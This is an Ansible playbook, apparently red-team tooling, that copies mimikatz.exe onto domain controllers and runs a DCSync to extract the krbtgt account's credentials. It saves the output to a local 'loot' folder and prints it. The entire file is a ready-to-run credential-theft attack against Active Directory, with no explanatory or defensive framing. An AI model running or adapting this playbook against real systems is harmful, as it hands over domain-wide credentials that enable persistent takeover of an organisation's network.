---
- name: Execute Mimikatz via Ansible
  hosts: domain-controllers
  gather_facts: yes
  vars:
    domain: red.local
  tasks:
    - name: Copy mimikatz.exe to target
      win_copy:
        src: ../rsrc/mimikatz.exe
        dest: C:\Windows\System32\mimikatz.exe

    - name: Run DCSync command
      win_shell: C:\Windows\System32\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:{{ domain }} /user:krbtgt" "exit"
      register: dcsync_output

    - name: Save output to a local file on the Ansible controller
      delegate_to: localhost
      become: no
      copy:
        content: "{{ dcsync_output.stdout }}"
        dest: "./loot/{{ inventory_hostname }}_dcsync.txt"

    - name: Show Results
      debug:
        msg: "{{ dcsync_output.stdout }}"